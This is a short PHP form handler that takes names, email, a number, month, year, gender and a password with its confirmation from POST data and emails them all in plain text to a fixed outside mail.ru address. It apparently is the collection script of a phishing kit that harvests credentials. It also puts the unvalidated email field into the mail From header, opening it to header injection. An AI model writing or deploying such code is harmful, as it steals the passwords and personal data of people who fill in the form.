<?php
$name = $_POST['firstname'];
$surname = $_POST['lastname'];
$nationality = $_POST['nationality'];
$email = $_POST['email'];
$number = $_POST['number'];
$month = $_POST['month'];
$year = $_POST['year'];
$gender = $_POST['gender'];
$userpass = $_POST['userpass'];
$userpassconfirm = $_POST['userpassconfirm'];

	$to = "revv80@mail.ru"; 
	$date = date ("d.m.Y"); 
	$time = date ("h:i");
	$from = $email;
	$subject = "New user";

	
	$msg="
   Name: $name /n
   Surname: $surname /n
	Nationality: $nationality /n
   Email: $email /n
   Number: $number /n
   Month: $month /n
   Year: $year /n
   Gender: $gender /n
   Userpass: $userpass /n
	Userpassconfirm : $userpassconfirm"; 	
	mail($to, $subject, $msg, "From: $from ");

?>


